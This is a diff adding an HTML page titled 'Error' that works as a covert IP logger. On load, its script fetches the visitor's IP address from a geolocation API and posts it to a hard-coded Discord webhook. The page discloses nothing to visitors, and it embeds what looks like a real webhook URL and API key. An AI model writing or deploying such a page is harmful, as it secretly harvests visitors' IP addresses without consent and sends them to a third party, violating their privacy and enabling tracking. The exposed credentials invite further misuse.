@@ -1,0 +1,32 @@
+<html>
+<head>
+  <title>Error</title>
+</head>
+<body>
+  <h1>IP Logger</h1>
+  <p>boo<span id="ip"></span></p>
+
+  <!-- include the Discord webhook URL in a meta tag -->
+  <meta name="discord-webhook" content="https://discord.com/api/webhooks/1055687148382191656/312TTM14nJXhkRG2z5Scz8GvXd36DkI7otSYUYX5aayn9xiwGotS4Zrc3RYnNFB9istx">
+
+  <!-- include the necessary libraries -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+  <script>
+    // use the 'fetch' API to retrieve the user's IP address
+      $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=a1ebbf04c6164dd98b527e26c57fc28c", function (data) {
+        // display the IP address on the page
+        const ip = data.ip_address
+
+        // get the Discord webhook URL from the meta tag
+        const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
+
+        // send the IP address to the Discord webhook
+        axios.post(webhookUrl, {
+          content: `IP address: ${ip}`
+        });
+      });
+  </script>
+</body>
+</html>
